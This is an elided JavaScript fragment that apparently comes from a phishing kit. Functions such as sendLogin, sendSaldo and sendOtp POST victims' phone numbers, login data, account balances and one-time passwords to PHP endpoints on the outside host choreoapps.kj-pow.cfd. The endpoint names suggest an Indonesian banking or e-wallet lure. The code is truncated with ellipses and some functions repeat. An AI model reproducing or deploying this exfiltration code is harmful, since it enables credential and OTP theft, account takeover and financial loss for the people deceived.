function sendHp() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/11/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/11/sudah.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/11/saldosdh.php',
      type: 'POST',
...
function sendOtp() {        
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/11/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/11/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/11/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/11/otpblm.php',
      type: 'POST',
